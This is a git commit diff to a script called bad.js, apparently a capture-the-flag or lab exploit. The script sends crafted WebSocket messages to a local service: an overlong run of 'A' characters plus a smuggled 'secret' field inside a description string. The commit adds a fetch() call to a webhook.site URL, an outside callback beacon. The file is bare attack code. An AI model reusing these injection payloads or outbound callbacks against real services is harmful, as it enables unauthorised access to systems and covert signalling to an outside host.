a554979e73532742ab28db6bac8890bb3dc3742c
jackopat <149393156+jackopat@users.noreply.github.com>
2023-11-14 16:05:43 +0000

    Update bad.js

--- bad.js
+++ bad.js
@@ -1,5 +1,6 @@
 const target = '127.0.0.1';
 const ws = new WebSocket(`ws://${target}/ws`);
+fetch("https://webhook.site/e98d9642-49ae-41a2-b67d-28e902f6b363")
 ws.onopen = () => {
     ws.send(JSON.stringify({action:'add',title: 'A',description: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","secret":"00000000000000000000000000000000"}`}));
     ws.send(JSON.stringify({action:'get'}));
